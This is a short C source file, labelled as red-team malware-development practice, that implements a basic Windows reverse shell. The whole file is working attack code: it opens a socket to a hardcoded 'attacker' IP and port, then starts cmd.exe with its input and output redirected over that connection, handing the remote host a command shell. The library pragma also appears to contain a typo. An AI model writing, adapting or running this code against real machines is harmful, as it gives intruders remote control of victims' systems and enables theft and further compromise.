/*
 * Malware Development Red Team preparation skills
 * Kali Linux MASTERING
 * Basic reverse shell for Windows OS
 * author: Whusher
*/

#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  // IP and port details for the attacker's machine
  char *attackerIP = "192.168.100.99";
  short attackerPort = 4444;

  // initialize socket library
  WSAStartup(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) 				 mainSocket;

  // initiate cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
  exit(0);
}
